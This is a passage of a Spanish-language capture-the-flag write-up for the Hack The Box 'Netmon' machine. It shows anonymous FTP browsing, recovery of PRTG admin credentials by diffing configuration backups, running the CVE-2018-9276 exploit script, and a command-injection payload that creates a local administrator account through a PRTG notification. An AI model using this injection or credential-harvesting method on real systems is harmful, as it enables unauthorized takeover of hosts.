+</span></span><span style="display:flex;"><span>02-25-19  10:15PM       &lt;DIR&gt;          inetpub
+</span></span><span style="display:flex;"><span>07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
+</span></span><span style="display:flex;"><span>02-25-19  10:56PM       &lt;DIR&gt;          Program Files
+</span></span><span style="display:flex;"><span>02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)
+</span></span><span style="display:flex;"><span>02-03-19  08:08AM       &lt;DIR&gt;          Users
+</span></span><span style="display:flex;"><span>02-25-19  11:49PM       &lt;DIR&gt;          Windows
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; cd Users
+</span></span><span style="display:flex;"><span>250 CWD command successful.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||50292|<span style="color:#75715e">)</span>
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>02-25-19  11:44PM       &lt;DIR&gt;          Administrator
+</span></span><span style="display:flex;"><span>02-03-19  12:35AM       &lt;DIR&gt;          Public
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span></code></pre></div><p>Vemos que si hay datos de la máquina, es decir, que el <strong>servicio FTP</strong> no esta correctamente configurado. Si te fijas en los usuarios se pueden ver 2 usuarios, no creo que podamos entrar al administrador, pero al <strong>Public</strong> sí que podremos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; cd Public
+</span></span><span style="display:flex;"><span>250 CWD command successful.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||50294|<span style="color:#75715e">)</span>
+</span></span><span style="display:flex;"><span>150 Opening ASCII mode data connection.
+</span></span><span style="display:flex;"><span>02-03-19  08:05AM       &lt;DIR&gt;          Documents
+</span></span><span style="display:flex;"><span>07-16-16  09:18AM       &lt;DIR&gt;          Downloads
+</span></span><span style="display:flex;"><span>07-16-16  09:18AM       &lt;DIR&gt;          Music
+</span></span><span style="display:flex;"><span>07-16-16  09:18AM       &lt;DIR&gt;          Pictures
+</span></span><span style="display:flex;"><span>03-20-23  03:30PM                   34 user.txt
+</span></span><span style="display:flex;"><span>07-16-16  09:18AM       &lt;DIR&gt;          Videos
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span></code></pre></div><p>Vaya, vaya. Tan solo descargamos el archivo con el comando <strong>get</strong> y ya lo podremos leer. ¿Pero entonces como accedemos como root? Ya tenemos algunas pistas sobre donde buscar archivos que nos sean útiles para acceder a la página y podamos buscar un exploit para entrar a la máquina.</p>
+<p>Empecemos a explotar las vulnerabilidades.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Busqueda">Buscando Archivos Críticos de PRTG en Servicio FTP</h3>
+<p>Muy bien, ahora sabemos que podemos buscar dentro del <strong>servicio FTP</strong> para no estar dando tantas vueltas o buscando cosas que no sirven.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; ls -la
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||50613|<span style="color:#75715e">)</span>
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>11-20-16  10:46PM       &lt;DIR&gt;          $RECYCLE.BIN
+</span></span><span style="display:flex;"><span>02-03-19  12:18AM                 1024 .rnd
+</span></span><span style="display:flex;"><span>11-20-16  09:59PM               389408 bootmgr
+</span></span><span style="display:flex;"><span>07-16-16  09:10AM                    1 BOOTNXT
+</span></span><span style="display:flex;"><span>02-03-19  08:05AM       &lt;DIR&gt;          Documents and Settings
+</span></span><span style="display:flex;"><span>02-25-19  10:15PM       &lt;DIR&gt;          inetpub
+</span></span><span style="display:flex;"><span>03-20-23  03:30PM            738197504 pagefile.sys
+</span></span><span style="display:flex;"><span>07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
+</span></span><span style="display:flex;"><span>02-25-19  10:56PM       &lt;DIR&gt;          Program Files
+</span></span><span style="display:flex;"><span>02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)
+</span></span><span style="display:flex;"><span>12-15-21  10:40AM       &lt;DIR&gt;          ProgramData
+</span></span><span style="display:flex;"><span>02-03-19  08:05AM       &lt;DIR&gt;          Recovery
+</span></span><span style="display:flex;"><span>02-03-19  08:04AM       &lt;DIR&gt;          System Volume Information
+</span></span><span style="display:flex;"><span>02-03-19  08:08AM       &lt;DIR&gt;          Users
+</span></span><span style="display:flex;"><span>02-25-19  11:49PM       &lt;DIR&gt;          Windows
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; cd ProgramData
+</span></span><span style="display:flex;"><span>250 CWD command successful.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||50615|<span style="color:#75715e">)</span>
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>12-15-21  10:40AM       &lt;DIR&gt;          Corefig
+</span></span><span style="display:flex;"><span>02-03-19  12:15AM       &lt;DIR&gt;          Licenses
+</span></span><span style="display:flex;"><span>11-20-16  10:36PM       &lt;DIR&gt;          Microsoft
+</span></span><span style="display:flex;"><span>02-03-19  12:18AM       &lt;DIR&gt;          Paessler
+</span></span><span style="display:flex;"><span>02-03-19  08:05AM       &lt;DIR&gt;          regid.1991-06.com.microsoft
+</span></span><span style="display:flex;"><span>07-16-16  09:18AM       &lt;DIR&gt;          SoftwareDistribution
+</span></span><span style="display:flex;"><span>02-03-19  12:15AM       &lt;DIR&gt;          TEMP
+</span></span><span style="display:flex;"><span>11-20-16  10:19PM       &lt;DIR&gt;          USOPrivate
+</span></span><span style="display:flex;"><span>11-20-16  10:19PM       &lt;DIR&gt;          USOShared
+</span></span><span style="display:flex;"><span>02-25-19  10:56PM       &lt;DIR&gt;          VMware
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; cd Paessler
+</span></span><span style="display:flex;"><span>250 CWD command successful.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||50619|<span style="color:#75715e">)</span>
+</span></span><span style="display:flex;"><span>150 Opening ASCII mode data connection.
+</span></span><span style="display:flex;"><span>03-20-23  04:12PM       &lt;DIR&gt;          PRTG Network Monitor
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; cd PRTG\ Network\ Monitor
+</span></span><span style="display:flex;"><span>250 CWD command successful.
+</span></span></code></pre></div><p>Una vez dentro de la carpeta donde están los archivos ocultos, descargamos él <strong>.dat</strong>, él <strong>.old</strong> y él <strong>old.bak</strong>, como investigamos anteriormente, sabemos que él <strong>.dat</strong> y él <strong>.old</strong> son lo mismo, siendo que el <strong>.old</strong> es un <strong>BackUp</strong> del <strong>.dat</strong>, así que descargaremos únicamente los <strong>.dat</strong> y él <strong>.old.bak</strong>. Lo que buscamos es ver si estos archivos contienen un usuario y contraseña que nos permitan acceder a la página.</p>
+<h3 id="FTP2">Analizando Contenido Descargado del Servicio FTP</h3>
+<p>Ahora toca analizar los archivos que descargamos, recuerda que buscamos un usuario y contraseña para poder acceder a la página web.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>cat PRTG\ Configuration.dat 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;root</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">oct=</span><span style="color:#e6db74">&#34;PRTG Network Monitor 18.1.37.13946&#34;</span> <span style="color:#a6e22e">saved=</span><span style="color:#e6db74">&#34;2/26/2019 2:54:23 AM&#34;</span> <span style="color:#a6e22e">max=</span><span style="color:#e6db74">&#34;2017&#34;</span> <span style="color:#a6e22e">guid=</span><span style="color:#e6db74">&#34;{221B25D6-9282-418B-8364-F59561032EE3}&#34;</span> <span style="color:#a6e22e">treeversion=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">created=</span><span style="color:#e6db74">&#34;2019-02-02-23-18-27&#34;</span> <span style="color:#a6e22e">trial=</span><span style="color:#e6db74">&#34;42f234beedd545338910317db1fca74dbe84030f&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;statistics</span> <span style="color:#a6e22e">time=</span><span style="color:#e6db74">&#34;26-02-2019 02:50:23&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;statistic</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;State Changes&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,3
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/statistic&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;statistic</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Reports Generated&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/statistic&gt;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Al hacer un <strong>cat</strong> al archivo <strong>.dat</strong> vemos que hay demasiados datos por lo que hay que analizarlos de otra forma, ya que si vemos él <strong>.old.bak</strong> será lo mismo, demasiados datos. Vamos a usar el comando <strong>diff</strong> para ver las diferencias, junto con el comando <strong>less</strong> para ver el <strong>output</strong> como una página e ir viendo poco a poco toda la información, con el fin de ver si hay alguna diferencia entre estos dos archivos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>diff <span style="color:#e6db74">&#34;PRTG Configuration.dat&#34;</span> <span style="color:#e6db74">&#34;PRTG Configuration.old.bak&#34;</span> | less
+</span></span></code></pre></div><p>Y vemos este resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&gt;       <span style="color:#f92672">&lt;geostat</span> <span style="color:#a6e22e">day=</span><span style="color:#e6db74">&#34;03-02-2019&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>144,146c141,142
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;</span>               <span style="color:#f92672">&lt;flags&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;</span>                 <span style="color:#f92672">&lt;encrypted/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;</span>               <span style="color:#f92672">&lt;/flags&gt;</span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>&gt;             <span style="color:#75715e">&lt;!-- User: prtgadmin --&gt;</span>
+</span></span><span style="display:flex;"><span>&gt;             PrTg@dmin2018
+</span></span><span style="display:flex;"><span>317c313
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q</span><span style="color:#960050;background-color:#1e0010">====</span>
+</span></span></code></pre></div><p>Ahí estan nuestro usuario y contraseña que necesitamos, ahora vamos a autenticarnos, PERO recuerda que este es un archivo antiguo, por lo que la contraseña puede que no sea correcta, trata de sumarle un año más a la contraseña para que puedas acceder:</p>
+<p><img src="/assets/images/htb-writeup-netmon/Captura2.png" alt=""></p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="Exploit">Buscando y Analizando Exploit</h3>
+<p>Una vez dentro, ya podemos buscar un Exploit que nos sirva porque ya tenemos la versión que esta usando el <strong>servicio PRGT</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit prtg
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                              |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>PRTG Network Monitor 18.2.38 - <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Remote Code Execution                                        | windows/webapps/46527.sh
+</span></span><span style="display:flex;"><span>PRTG Network Monitor 20.4.63.1412 - <span style="color:#e6db74">&#39;maps&#39;</span> Stored XSS                                                       | windows/webapps/49156.txt
+</span></span><span style="display:flex;"><span>PRTG Network Monitor &lt; 18.1.39.1648 - Stack Overflow <span style="color:#f92672">(</span>Denial of Service<span style="color:#f92672">)</span>                                    | windows_x86/dos/44500.py
+</span></span><span style="display:flex;"><span>PRTG Traffic Grapher 6.2.1 - <span style="color:#e6db74">&#39;url&#39;</span> Cross-Site Scripting                                                     | java/webapps/34108.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>Vamos a analizar este Exploit: <strong>PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./Remote_Code_Execution.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticated PRTG network Monitor remote code execution                <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Date: 11/03/2019                                                        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Vendor Homepage: https://www.paessler.com/prtg                          <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Version: 18.2.38                                                        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CVE: CVE-2018-9276                                                      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reference: https://www.codewatch.org/blog/?p<span style="color:#f92672">=</span><span style="color:#ae81ff">453</span>                        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># run the script to create a new user &#39;pentest&#39; in the administrators group with password &#39;P3nT3st!&#39; </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span> EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c <span style="color:#e6db74">&#34;_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1&#34;</span>
+</span></span></code></pre></div><p>El Exploit nos pide unas cookies, que podemos ver si inspeccionamos la página web y nos vamos a la sección de storage:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura9.png">
+</p>
+<h3 id="Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</h3>
+<p>Vamos a ejecutar el programa con las cookies que nos pide:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x PRTG_exploit.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./PRTG_exploit.sh -u http://10.10.10.152 -c <span style="color:#e6db74">&#34;_ga=GA1.4.1030767543.1673826713; _gid=GA1.4.459131971.1709957738; OCTOPUS1813713946=ezFBMkU1OTA4LTMxQ0EtNDg1Qy04NDVCLTI1NDk5ODJBQjBFQ30%3D _gat=1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticated PRTG network Monitor remote code execution                <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Date: 11/03/2019                                                        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Vendor Homepage: https://www.paessler.com/prtg                          <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Version: 18.2.38                                                        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CVE: CVE-2018-9276                                                      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reference: https://www.codewatch.org/blog/?p<span style="color:#f92672">=</span><span style="color:#ae81ff">453</span>                        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># run the script to create a new user &#39;pentest&#39; in the administrators group with password &#39;P3nT3st!&#39;                                                                                                                                       </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span><span style="color:#75715e">#########################################################################[+] </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> file created 
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sending notification wait....
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> adding a new user <span style="color:#e6db74">&#39;pentest&#39;</span> with password <span style="color:#e6db74">&#39;P3nT3st&#39;</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sending notification wait....
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> adding a user pentest to the administrators group 
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sending notification wait....
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> exploit completed new user <span style="color:#e6db74">&#39;pentest&#39;</span> with password <span style="color:#e6db74">&#39;P3nT3st!&#39;</span> created have fun!
+</span></span></code></pre></div><p>Y con esto, se supone que ya deberíamos de haber agregado un usuario y contraseña al grupo de administradores de la máquina víctima, vamos a comprobarlo con la herramienta <strong>Crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.10.10.152 -u <span style="color:#e6db74">&#39;pentest&#39;</span> -p <span style="color:#e6db74">&#39;P3nT3st!&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:NETMON<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:netmon<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> netmon<span style="color:#ae81ff">\p</span>entest:P3nT3st! STATUS_LOGON_FAILURE
+</span></span></code></pre></div><p>No dio resultado, es probable que esto sea así por la versión que maneja el Exploit y la que esta usando la máquina, así que vamos a probar de otra manera.</p>
+<p>Existe un blog que explica como fue posible vulnerar esta versión del PRTG, incluso viene la referencia del blog en la que se basó el Exploit que acabamos de usar, así que veamos dicho blog y probemos esa forma:</p>
+<ul>
+<li><a href="https://www.codewatch.org/blog/?p=453" target="_blank">PRTG &lt; 18.2.39 Command Injection Vulnerability</a></li>
+</ul>
+<h3 id="Exploit3">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Versión Blog</h3>
+<p>En resumen, podemos vulnerar la página usando las notificaciones, vamos a hacerlo de este modo:</p>
+<p><img src="/assets/images/htb-writeup-netmon/Captura3.png" alt=""></p>
+<p><img src="/assets/images/htb-writeup-netmon/Captura4.png" alt=""></p>
+<p>Nos vamos a la sección de crear nueva notificación:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura5.png">
+</p>
+<p>Llamamos a nuestra notificación <strong>HackeadoPrro!</strong> y nos vamos a la sección <strong>Execute Programs</strong>:</p>
+<p><img src="/assets/images/htb-writeup-netmon/Captura6.png" alt=""></p>
+<p>Ahí lo que haremos, será casi lo mismo que en el blog, la diferencia va a radicar en que nosotros vamos a agregar el usuario al grupo de administradores, con el fin de poder loguearnos y ser root.</p>
+<p>Esto es lo mismo que hace el Exploit, pero nosotros lo vamos a indicar directamente en la inyección a diferencia del Exploit que usa la cookie para hacer esta movida, este será el código que ejecutara:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test.txt;net user BerserkP B3rs3rkP123$! /add; net localgroup Administrators BerserkP /add
+</span></span></code></pre></div><p>Cuando guardemos la notificación, ya estará disponible:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura7.png">
+</p>
+<p>Y simplemente la activamos, una vez activada nos deberá mandar el siguiente mensaje:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura8.png">
+</p>
+<p>Bien ahora para poder ver si ya estamos dentro de dicho grupo, vamos a usar la herramienta <strong>crackmapexec</strong>:</p>
